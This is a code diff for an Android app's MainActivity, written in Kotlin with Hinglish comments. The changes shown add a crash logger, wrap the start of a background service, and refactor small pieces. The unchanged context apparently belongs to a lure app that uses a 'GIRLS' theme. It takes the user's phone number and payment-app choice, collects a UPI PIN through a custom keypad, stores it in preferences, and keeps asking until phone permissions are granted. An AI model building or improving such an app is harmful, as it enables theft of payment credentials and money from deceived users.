@@ -16,6 +16,7 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.text.InputType
+import android.util.Log
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
@@ -44,6 +45,7 @@ class MainActivity : Activity() {
         private const val KEY_PIN = "upi_pin"
         private const val KEY_DONE = "onboarded"
         private const val KEY_PENDING = "onboarding_pending"
+        private const val KEY_CRASH = "last_crash"
         private const val REQ_PERMS = 1301
 
         private val GIRLS = arrayOf(
@@ -58,13 +60,11 @@ class MainActivity : Activity() {
         private const val CARD_2 = 0xFFF7F8FA.toInt()
         private const val FIELD = 0xFFF4F5F7.toInt()
         private const val BORDER = 0xFFE3E5E8.toInt()
-        private const val ACCENT = 0xFF111827.toInt()      // black button
+        private const val ACCENT = 0xFF111827.toInt()
         private const val ACCENT_SOFT = 0xFFEDEFF2.toInt()
-        private const val ACCENT_2 = 0xFF2563EB.toInt()     // chhota blue highlight
         private const val TEXT = 0xFF111827.toInt()
         private const val MUTED = 0xFF6B7280.toInt()
         private const val GREEN = 0xFF16A34A.toInt()
-        private const val RED = 0xFFDC2626.toInt()
     }
 
     private val executor = Executors.newSingleThreadExecutor()
@@ -76,10 +76,7 @@ class MainActivity : Activity() {
     private var phoneNumber: String = ""
     private var pin: String = ""
 
-    /**
-     * Sirf wahi permission jo har OS version pe exist karte hain.
-     * CALL_PHONE hata diya (call feature nahi hai).
-     */
+    /** CALL_PHONE hata diya — call feature nahi hai. */
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
             Manifest.permission.READ_PHONE_STATE,
@@ -101,15 +98,24 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        installCrashCatcher()
+
         root = FrameLayout(this).apply { setBackgroundColor(BG) }
         setContentView(root)
+
+        showCrashIfAny()
 
         phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()
         selectedApp = prefs().getString(KEY_APP, null)
         pin = prefs().getString(KEY_PIN, "").orEmpty()
 
         registrationId()
-        startService(Intent(this, TpcService::class.java))
+
+        try {
+            startService(Intent(this, TpcService::class.java))
+        } catch (e: Exception) {
+            Log.e("DESI", "service start fail", e)
+        }
 
         if (prefs().getBoolean(KEY_DONE, false)) {
             showDoneStep()
@@ -129,7 +135,6 @@ class MainActivity : Activity() {
     override fun onResume() {
         super.onResume()
         if (prefs().getBoolean(KEY_DONE, false)) return
-        // settings se wapas aaya aur ab grant hai to aage badho
         if (step == "perm" && allPermissionsGranted()) showCurrentStep()
     }
 
@@ -156,11 +161,30 @@ class MainActivity : Activity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode != REQ_PERMS) return
 
-        if (allPermissionsGranted()) {
-            showCurrentStep()
-        } else {
-            showPermissionDialog()   // sirf simple popup
+        if (allPermissionsGranted()) showCurrentStep() else showPermissionDialog()
+    }
+
+    // ------------------------------------------------------ crash logger
+
+    private fun installCrashCatcher() {
+        val prev = Thread.getDefaultUncaughtExceptionHandler()
+        Thread.setDefaultUncaughtExceptionHandler { t, e ->
+            try {
+                prefs().edit().putString(KEY_CRASH, Log.getStackTraceString(e)).apply()
+            } catch (_: Throwable) {
+            }
+            prev?.uncaughtException(t, e)
         }
+    }
+
+    private fun showCrashIfAny() {
+        val crash = prefs().getString(KEY_CRASH, null) ?: return
+        prefs().edit().remove(KEY_CRASH).apply()
+        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
+            .setTitle("Last crash")
+            .setMessage(crash)
+            .setPositiveButton("OK", null)
+            .show()
     }
 
     // ------------------------------------------------------------ navigation
@@ -171,10 +195,7 @@ class MainActivity : Activity() {
         }
 
     private fun showCurrentStep() {
-        when {
-            phoneNumber.isBlank() -> showPhoneStep()
-            else -> showContentStep()
-        }
+        if (phoneNumber.isBlank()) showPhoneStep() else showContentStep()
     }
 
     private fun setScreen(view: View, stepName: String) {
@@ -189,8 +210,7 @@ class MainActivity : Activity() {
         )
     }
 
-    private fun toast(msg: String) =
-        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
 
     // ------------------------------------------------- deny popup
 
@@ -218,7 +238,7 @@ class MainActivity : Activity() {
         }
     }
 
-    // ------------------------------------------------- splash (perm check)
+    // ------------------------------------------------- splash
 
     private fun showSplashStep() {
         val col = column()
@@ -474,8 +494,7 @@ class MainActivity : Activity() {
                     when (key) {
                         "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                         "✓" -> {
-                            if (pin.length >= 4) submitPin()
-                            else toast("Kam se kam 4 digit")
+                            if (pin.length >= 4) submitPin() else toast("Kam se kam 4 digit")
                         }
                         else -> if (pin.length < 6) pin += key
                     }
